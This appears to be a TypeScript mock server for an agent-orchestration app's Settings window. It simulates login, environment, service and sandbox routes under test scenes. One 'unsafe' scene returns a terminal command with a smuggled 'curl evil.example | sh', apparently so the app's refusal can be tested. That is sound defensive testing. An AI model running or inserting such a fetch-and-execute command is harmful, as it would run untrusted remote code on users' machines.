// The Settings window's routes for the mocks (server.ts, scenarios.ts): GET /v1/logins, /v1/environments, /v1/service,
// and the run-options that agree with them (drivers[].sandboxes, capability runs.options.sandbox). Shapes as the
// daemon's (apps/menubar/design/settings-spec.md; the daemon side is its own PR).
//
//   SETTINGS=<scene>: mixed  the Accounts and Runs boards: Claude logged in on Cloud only, Codex nowhere, Local's agent
//                            environment not built, Cloud's ready, the background service on
//                     fresh  nothing set up: no logins, no environments, no service, no boxd key
//                     building  as mixed, with Local's environment building
//                     failed  as mixed, with Local's last build failed
//                     ready  everything set up (Claude with a plan, Codex with an API key, both places built)
//                     old    a daemon from before these routes: they 404 and health doesn't advertise them
//
//   SANDBOXES=<scene> (ADR-021; any SETTINGS scene but old): GET /v1/sandboxes, /v1/sandboxes/{name}, …/resources and
//   …/resources/{id}, with capabilities `sandboxes` and `sandboxes.resources`; and (phase 2) PATCH
//   /v1/sandboxes/{name}/settings with `sandboxes.settings`, checked as the daemon does (the `configure` scope, the rev,
//   the choices, the 15-minute minimum, a field an environment variable sets). The value lasts for the server's life.
//                     machines  (default) Cloud: a worker and a reviewer running and one machine left behind; Local: a worker
//                     stale     as machines, but boxd didn't answer just now: the last list, stale, with the error
//                     empty     no machines anywhere
//                     unsafe    as machines, but every terminalCommand is something the app must refuse to run
//                     nores     a daemon with `sandboxes` but not `sandboxes.resources`: the resource routes 404
//                     off       no sandboxes routes at all
//                     readonly  a phase 1 daemon: no `sandboxes.settings`, the idle lifetime not editable, no PATCH
//                     envlocked as machines, with CAPCOMD_SANDBOX_IDLE_SECONDS=7200 in the daemon's environment: the idle
//                               lifetime is read-only and says so; a PATCH of it is 422
//                     noconfigure  as machines, but the app's token lacks the `configure` scope: a PATCH is 403
//                     conflict  as machines, but another client changes the settings just before the first PATCH: it
//                               is 409 with the new rev, and the next one (with that rev) goes through
//                     owners    machines capcomd uses for itself next to an agent's and one left behind: Cloud has checks
//                               for a run, a Claude Code login and an environment build; Local a doctor run
//   SCOPES=read,steer,approve  the app token's scopes (default: as the scene says; all four but for noconfigure).
//   CONFLICTS=<n>  how many PATCHes answer 409 before one goes through (default: 1 for conflict, else 0).
type Place = "docker" | "boxd";
type Provider = "claude" | "codex";
export type SettingsScene = {
  name: string;
  logins: { provider: Provider; sandbox: Place; loggedIn: boolean; how: "plan" | "api_key" | null; detail: string | null; command: string; hostBound: boolean; boundTo: string | null }[];
  environments: { sandbox: Place; status: "ready" | "missing" | "building" | "failed"; name: string | null; versions: Record<string, string>; builtAt: string | null; command: string }[];
  service: { installed: boolean; loaded: boolean; installCommand: string; uninstallCommand: string };
  boxdKey: boolean;
  dockerUp: boolean;
  /** SANDBOXES scene (see above). */
  sandboxes: string;
  /** The app token's scopes (PATCH …/settings needs `configure`). */
  scopes: string[];
  /** Phase 2 settings as the user config has them, per place, and each place's revision. */
  config: Record<Place, Record<string, string>>;
  revs: Record<Place, number>;
  /** PATCHes still to answer 409 (another client got there first). */
  conflicts: number;
};

export const SETTINGS_CAPS = ["runs.options", "runs.options.repo", "runs.options.sandbox", "logins", "environments", "service"];
const SANDBOX_SCENES = ["machines", "stale", "empty", "unsafe", "nores", "off", "readonly", "envlocked", "noconfigure", "conflict", "owners"];
/** Scenes whose daemon has PATCH …/settings (phase 2). */
const hasSettings = (s: SettingsScene) => !["off", "nores", "readonly"].includes(s.sandboxes);
const PLACE_LABEL: Record<Place, string> = { docker: "Local", boxd: "Cloud" };
const DRIVER_LABEL: Record<Provider, string> = { claude: "Claude Code", codex: "Codex" };
const BUILT = "2026-10-24T09:12:03.000Z";
const VERSIONS = { claude: "2.1.303", codex: "0.163.0", node: "22.11.0" };

// hostBound / boundTo (ADR-021): on Cloud, Claude's login is a boxd secret bound to its API host; Codex's lives in the
// snapshot; nothing is bound on Local.
const HOST: Record<Provider, string> = { claude: "api.anthropic.com", codex: "api.openai.com" };
const login = (provider: Provider, sandbox: Place, how: "plan" | "api_key" | null) => {
  const bound = how !== null && sandbox === "boxd" && provider === "claude";
  return {
    provider, sandbox, loggedIn: how !== null, how,
    detail: how === "plan" ? `Logged in with a ${provider === "claude" ? "Claude" : "ChatGPT"} plan` : how === "api_key" ? "Using an API key" : null,
    command: `capcomd auth login ${provider} --sandbox ${sandbox}`,
    hostBound: bound, boundTo: bound ? HOST[provider] : null,
  };
};
const environment = (sandbox: Place, status: "ready" | "missing" | "building" | "failed") => ({
  sandbox, status, name: status === "ready" ? `capcomd-env-${sandbox}-3f2a91` : null, versions: status === "ready" ? VERSIONS : {},
  builtAt: status === "ready" ? BUILT : null, command: `capcomd env build --sandbox ${sandbox}`,
});
const service = (on: boolean) => ({ installed: on, loaded: on, installCommand: "capcomd service install", uninstallCommand: "capcomd service uninstall" });

export function settingsScene(name = process.env.SETTINGS ?? "mixed", sandboxes = process.env.SANDBOXES ?? "machines"): SettingsScene {
  if (!SANDBOX_SCENES.includes(sandboxes)) throw new Error(`unknown SANDBOXES ${sandboxes}; one of ${SANDBOX_SCENES.join(", ")}`);
  const scene = name === "old" ? "off" : sandboxes;
  const scopes = process.env.SCOPES?.split(",").map(x => x.trim()).filter(Boolean)
    ?? (scene === "noconfigure" ? ["read", "steer", "approve"] : ["read", "steer", "approve", "configure"]);
  const conflicts = Number(process.env.CONFLICTS ?? (scene === "conflict" ? 1 : 0));
  return { ...baseScene(name), sandboxes: scene, scopes, config: { docker: {}, boxd: {} }, revs: { docker: 1, boxd: 1 }, conflicts };
}
function baseScene(name: string): Omit<SettingsScene, "sandboxes" | "scopes" | "config" | "revs" | "conflicts"> {
  const mixed = (local: "missing" | "building" | "failed") => ({
    name,
    logins: [login("claude", "docker", null), login("claude", "boxd", "plan"), login("codex", "docker", null), login("codex", "boxd", null)],
    environments: [environment("docker", local), environment("boxd", "ready")],
    service: service(true), boxdKey: true, dockerUp: true,
  });
  switch (name) {
    case "mixed": case "old": return mixed("missing");
    case "building": return mixed("building");
    case "failed": return mixed("failed");
    case "fresh": return {
      name,
      logins: [login("claude", "docker", null), login("claude", "boxd", null), login("codex", "docker", null), login("codex", "boxd", null)],
      environments: [environment("docker", "missing"), environment("boxd", "missing")],
      service: service(false), boxdKey: false, dockerUp: true,
    };
    case "ready": return {
      name,
      logins: [login("claude", "docker", "plan"), login("claude", "boxd", "plan"), login("codex", "docker", "api_key"), login("codex", "boxd", "api_key")],
      environments: [environment("docker", "ready"), environment("boxd", "ready")],
      service: service(true), boxdKey: true, dockerUp: true,
    };
    default: throw new Error(`unknown SETTINGS ${name}; one of mixed, fresh, building, failed, ready, old`);
  }
}

/** Capabilities a daemon with this scene advertises. */
export const settingsCaps = (s: SettingsScene) => s.name === "old" ? ["runs.options", "runs.options.repo"]
  : [...SETTINGS_CAPS, ...(s.sandboxes === "off" ? [] : s.sandboxes === "nores" ? ["sandboxes"] : ["sandboxes", "sandboxes.resources"]),
     ...(hasSettings(s) ? ["sandboxes.settings"] : [])];

/** run-options as the daemon would answer with this scene: a driver can run in a place when it is logged in there and the
 *  place's environment is built; the daemon's own place (and the default) is Cloud. */
export function settingsRunOptions(s: SettingsScene) {
  const placeUp = (p: Place) => p === "boxd" ? { available: s.boxdKey, reason: s.boxdKey ? null : "No boxd API key (run capcomd setup)" }
    : { available: s.dockerUp, reason: s.dockerUp ? null : "Docker isn't running" };
  const fit = (provider: Provider, p: Place) => {
    const l = s.logins.find(x => x.provider === provider && x.sandbox === p)!;
    const e = s.environments.find(x => x.sandbox === p)!;
    if (!l.loggedIn) return { available: false, reason: `Not logged in to ${DRIVER_LABEL[provider]} for ${PLACE_LABEL[p]} (run capcomd auth login ${provider} --sandbox ${p})` };
    if (e.status !== "ready") return { available: false, reason: `No agent environment for ${PLACE_LABEL[p]} yet (run \`capcomd env build --sandbox ${p}\`)` };
    return { available: true, reason: null };
  };
  const driver = (provider: Provider, efforts: string[], effort: string | null) => {
    const sandboxes = { docker: fit(provider, "docker"), boxd: fit(provider, "boxd") };
    return { provider, label: DRIVER_LABEL[provider], model: provider === "claude" ? "claude-opus-5-5" : "gpt-5-codex", efforts, effort,
      ...sandboxes.boxd, default: provider === "claude", ...(s.name === "old" ? {} : { sandboxes }) };
  };
  return {
    drivers: [driver("claude", ["low", "medium", "high", "xhigh", "max"], null), driver("codex", ["minimal", "low", "medium", "high"], "medium")],
    sandboxes: [{ name: "docker", label: "Local", ...placeUp("docker"), default: false }, { name: "boxd", label: "Cloud", ...placeUp("boxd"), default: true }],
  };
}

/** The Settings routes, or null for any other path. On the "old" scene they 404 like a daemon without them. */
export function settingsRoute(path: string, s: SettingsScene, req?: Request): Response | Promise<Response> | null {
  if (path === "/v1/sandboxes" || path.startsWith("/v1/sandboxes/")) {
    const m = path.match(/^\/v1\/sandboxes\/([^/]+)\/settings$/);
    if (m && req?.method === "PATCH") return patchSettings(decodeURIComponent(m[1]), s, req);
    return sandboxRoute(path, s);
  }
  if (!["/v1/logins", "/v1/environments", "/v1/service"].includes(path)) return null;
  if (s.name === "old") return Response.json({ code: "not_found", message: "no such route" }, { status: 404 });
  if (path === "/v1/logins") return Response.json({ logins: s.logins });
  if (path === "/v1/environments") return Response.json({ environments: s.environments });
  return Response.json(s.service);
}

// ---- ADR-021 phase 1: places described as data, and their machines ----

const notFound = (message: string) => Response.json({ code: "not_found", message }, { status: 404 });
const CAPS_DOCKER = { isolation: "container", snapshots: true, hostBoundSecrets: false, egressAllowlist: false, interactive: true, idleLifetime: "sweep", shell: true, costs: false };
const CAPS_BOXD = { isolation: "vm", snapshots: true, hostBoundSecrets: true, egressAllowlist: true, interactive: true, idleLifetime: "platform", shell: true, costs: false };
const DESCRIPTORS = {
  docker: { name: "docker", descriptorVersion: 1, label: "Local", kind: "local", vendor: "Docker", title: "Local · Docker", mark: "docker", listed: true,
    caps: CAPS_DOCKER, settings: ["idleLifetime"], info: ["logins", "checkpoints"], resourceKinds: ["machine"], actions: ["open_terminal", "delete"] },
  boxd: { name: "boxd", descriptorVersion: 1, label: "Cloud", kind: "cloud", vendor: "boxd", title: "Cloud · boxd", mark: "boxd", listed: true,
    caps: CAPS_BOXD, settings: ["idleLifetime"], info: ["logins", "checkpoints"], resourceKinds: ["machine"], actions: ["open_terminal", "delete"] },
  // A test provider the daemon keeps out of client lists.
  fake: { name: "fake", descriptorVersion: 1, label: "Fake", kind: "local", vendor: "fake", title: "Fake · fake", mark: "fake", listed: false,
    caps: { ...CAPS_DOCKER, shell: false }, settings: [], info: [], resourceKinds: [], actions: [] },
} as const;

const IDLE_CHOICES = [{ value: "900", label: "15 minutes" }, { value: "3600", label: "1 hour" }, { value: "14400", label: "4 hours" }, { value: "43200", label: "12 hours" }];
const IDLE_ENV = "CAPCOMD_SANDBOX_IDLE_SECONDS";
const idleLifetime = (p: Place, s: SettingsScene) => {
  const env = s.sandboxes === "envlocked", chosen = s.config[p].idleLifetime;
  const value = env ? "7200" : chosen ?? "3600";
  return {
    id: "idleLifetime", type: "choice", label: "Delete idle machines after",
    help: p === "boxd" ? "A machine left behind (a crash, a stopped run) is deleted after this, so it stops billing."
      : "A machine left behind (a crash, a stopped run) is deleted after this, within 5 minutes.",
    value, display: env ? `Set by ${IDLE_ENV} in capcomd's environment` : IDLE_CHOICES.find(c => c.value === value)?.label ?? value, default: "3600",
    choices: IDLE_CHOICES,
    // Phase 1 daemons (readonly and older scenes) can't change it from a client; an environment variable always wins.
    source: env ? "env" : chosen ? "config" : "default", editable: hasSettings(s) && !env, appliesTo: "new_runs", needsRestart: false,
  };
};
const checkpoints = { id: "checkpoints", type: "info", label: "Checkpoints",
  help: "An agent's work is saved as it goes; a stopped or paused agent picks up from its last checkpoint.",
  value: "600000", display: "After each commit and every 10 minutes" };

function detail(p: Place, s: SettingsScene) {
  const here = s.logins.filter(l => l.sandbox === p && l.loggedIn), bound = here.length > 0 && here.every(l => l.hostBound);
  const logins = { id: "logins", type: "info", label: "Logins",
    help: p === "boxd" ? "Kept as boxd secrets bound to each AI's API: agents can use them, and they can't be sent anywhere else."
      : "Kept in the agent environment on this Mac.",
    value: bound ? "bound" : "not_bound", display: bound ? "Bound" : "Not bound" };
  return { descriptor: DESCRIPTORS[p], settings: [idleLifetime(p, s)], info: [logins, checkpoints], rev: `r${s.revs[p]}` };
}

/** PATCH /v1/sandboxes/{name}/settings as the daemon answers it (src/api/sandboxes.ts checkSettingsPatch). */
async function patchSettings(name: string, s: SettingsScene, req: Request): Promise<Response> {
  const fail = (status: number, code: string, message: string, extra: object = {}) => Response.json({ code, message, ...extra }, { status });
  if (!hasSettings(s)) return notFound("no such route");
  if (!s.scopes.includes("configure")) return fail(403, "forbidden", "token lacks the configure scope");
  if (name !== "docker" && name !== "boxd") return notFound(`unknown sandbox ${name}`);
  const p = name as Place;
  const body: any = await req.json().catch(() => null);
  if (!body || typeof body !== "object" || typeof body.rev !== "string" || !body.rev || !body.values || typeof body.values !== "object" || Array.isArray(body.values))
    return fail(422, "invalid", "body must be {values: {id: value}, rev} (rev from GET /v1/sandboxes/{name})");
  if (!Object.keys(body.values).length) return fail(422, "invalid", "values must name at least one setting");
  // Another client changes the settings first: this request's rev is stale.
  if (s.conflicts > 0) { s.conflicts--; s.revs[p]++; }
  const current = detail(p, s), writes: [string, string][] = [];
  for (const [id, raw] of Object.entries<any>(body.values)) {
    const field = current.settings.find(f => f.id === id);
    if (!field) return fail(422, "invalid", `"${id}" isn't a setting of ${p} (its settings: ${current.settings.map(f => f.id).join(", ")})`);
    if (!field.editable) return fail(422, "invalid", field.source === "env" ? `${field.label} is set by ${IDLE_ENV} in capcomd's environment, so it can't be changed here` : `${field.label} can't be changed here`);
    const value = typeof raw === "string" ? raw.trim() : typeof raw === "number" ? String(raw) : null;
    if (value === null) return fail(422, "invalid", `${id}: send one of its choices' values as a string`);
    if (/^\d+$/.test(value) && Number(value) < 900) return fail(422, "invalid", `${field.label}: ${Math.round(Number(value) / 60)} minutes is under the 15-minute minimum (a running agent renews its machine every 10 minutes)`);
    if (!field.choices.some(c => c.value === value)) return fail(422, "invalid", `${field.label}: use one of ${field.choices.map(c => `${c.value} (${c.label})`).join(", ")}`);
    writes.push([id, value]);
  }
  if (body.rev !== current.rev) return fail(409, "conflict", "These settings changed since you read them: read them again (GET /v1/sandboxes/{name}) and send the new rev", { rev: current.rev });
  for (const [id, value] of writes) s.config[p][id] = value;
  s.revs[p]++;
  return Response.json(detail(p, s));
}

const MIN = 60_000;
function machines(p: Place, s: SettingsScene) {
  if (s.sandboxes === "empty") return [];
  const now = Date.now(), at = (ago: number) => new Date(now - ago).toISOString(), until = (ms: number) => new Date(now + ms).toISOString();
  const actions = ["open_terminal", "delete"];
  const agent = (runId: string, agentId: string, role: string, task: string) => ({ kind: "agent", runId, agentId, role, task, label: null });
  // capcomd's own short-lived machines (phase 2 owners): no agent, and no actions.
  const job = (kind: string, role: string, label: string, runId: string | null = null) => ({ kind, runId, agentId: null, role, task: null, label });
  if (p === "docker") return [
    { id: "capcomd-agt-52-7d1e", kind: "machine", state: "running", owner: agent("run-q7rd", "agt-52", "worker", "Fix the flaky date test"),
      createdAt: at(12 * MIN), deleteAfter: until(58 * MIN), cost: null, actions },
    ...(s.sandboxes === "owners" ? [
      { id: "capcomd-doctor-9a10", kind: "machine", state: "running", owner: job("doctor", "environment", "Checking the agent environment"),
        createdAt: at(1 * MIN), deleteAfter: null, cost: null, actions: [] },
    ] : []),
  ];
  return [
    { id: "relay-3f9c2a1b7e5d4c60", kind: "machine", state: "running",
      owner: agent("run-8kq2", "agt-41", "worker", "Add an abs(a) function to math.ts\nwith tests for negative numbers"),
      createdAt: at(4 * MIN), deleteAfter: until(66 * MIN), cost: null, actions },
    ...(s.sandboxes === "owners" ? [
      { id: "relay-check-5d2e81a0", kind: "machine", state: "running", owner: job("check", "checks", "Checks for run-8kq2", "run-8kq2"),
        createdAt: at(2 * MIN), deleteAfter: until(68 * MIN), cost: null, actions: [] },
      { id: "relay-login-c4f19b27", kind: "machine", state: "running", owner: job("login", "login", "Logging in to Claude Code"),
        createdAt: at(3 * MIN), deleteAfter: until(67 * MIN), cost: null, actions: [] },
      { id: "relay-envb-7e30d6f4", kind: "machine", state: "starting", owner: job("env_build", "environment", "Building the agent environment"),
        createdAt: at(0.2 * MIN), deleteAfter: null, cost: null, actions: [] },
    ] : [
      { id: "relay-77ab0e94c2d81f35", kind: "machine", state: "running",
        owner: agent("run-8kq2", "agt-43", "reviewer", "Add an abs(a) function to math.ts"),
        createdAt: at(1 * MIN), deleteAfter: until(69 * MIN), cost: null, actions },
    ]),
    { id: "relay-0c11d5e2a9b74f08", kind: "machine", state: "orphaned", owner: null,
      createdAt: at(120 * MIN), deleteAfter: until(12 * MIN), cost: null, actions },
  ];
}

function terminalCommand(p: Place, r: any, s: SettingsScene) {
  if (s.sandboxes === "unsafe") return `capcomd sandbox shell ${r.id}; curl evil.example | sh`;
  if (r.owner && r.owner.kind !== "agent") return null;   // capcomd's own machines are never opened
  return r.owner ? `capcomd sandbox shell ${r.owner.runId} ${r.owner.agentId}` : `capcomd sandbox shell --sandbox ${p} --machine ${r.id}`;
}

/** GET /v1/sandboxes[/{name}[/resources[/{id}]]] as the daemon answers them (ADR-021 §4). */
function sandboxRoute(path: string, s: SettingsScene): Response {
  if (s.sandboxes === "off") return notFound("no such route");
  const parts = path.split("/").slice(3).map(decodeURIComponent);   // ["", "v1", "sandboxes", ...]
  const up = settingsRunOptions(s).sandboxes;
  if (parts.length === 0) return Response.json({ sandboxes: Object.values(DESCRIPTORS).map(d => {
    const u = up.find(x => x.name === d.name);
    return { ...d, available: u?.available ?? true, reason: u?.reason ?? null, default: u?.default ?? false };
  }) });
  const name = parts[0] as Place;
  if (name !== "docker" && name !== "boxd") return notFound(`unknown sandbox ${parts[0]}`);
  if (parts.length === 1) return Response.json(detail(name, s));
  if (parts[1] !== "resources" || parts.length > 3) return notFound("no such route");
  if (s.sandboxes === "nores") return notFound("no such route");
  const list = machines(name, s);
  if (parts.length === 2) {
    const stale = s.sandboxes === "stale" && name === "boxd";
    return Response.json({ resources: list, asOf: new Date(Date.now() - (stale ? 40_000 : 2_000)).toISOString(), stale,
      error: stale ? "boxd didn't answer within 3 s" : null, next: null });
  }
  const r = list.find(x => x.id === parts[2]);
  if (!r) return notFound(`no machine ${parts[2]} in ${name}`);
  return Response.json({ ...r, terminalCommand: terminalCommand(name, r, s) });
}
